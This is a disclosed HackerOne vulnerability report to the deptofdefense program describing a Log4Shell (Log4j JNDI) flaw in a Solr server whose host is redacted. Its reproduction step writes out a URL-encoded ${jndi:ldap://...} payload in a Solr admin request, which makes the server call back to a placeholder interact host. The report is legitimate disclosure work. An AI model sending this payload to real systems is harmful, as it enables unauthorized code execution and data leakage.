# solr_log4j - http://██████████

## Report Details
- **Report ID**: 1631370
- **URL**: https://hackerone.com/reports/1631370
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2022-07-08T14:08:07.860Z
- **Disclosed**: 2022-09-06T19:10:39.069Z

## Reporter
- **Username**: hachimanxienim
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: deptofdefense

## Vulnerability Information
Hi security team, i found a solr log4j vulnerability in your aplication

## Impact

Logging untrusted or user controlled data with a vulnerable version of Log4J may result in Remote Code Execution (RCE) against your application. This includes untrusted data included in logged errors such as exception traces, authentication failures, and other unexpected vectors of user controlled input

## System Host(s)
████████

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
Just send get request to this path and change your interact server

PATH ----> http://████████/solr/admin/collections?action=$%7Bjndi:ldap://$%7BhostName%7D.YOURINTERACTSERVER/a%7D

## Suggested Mitigation/Remediation Actions




## Attachments
No attachments
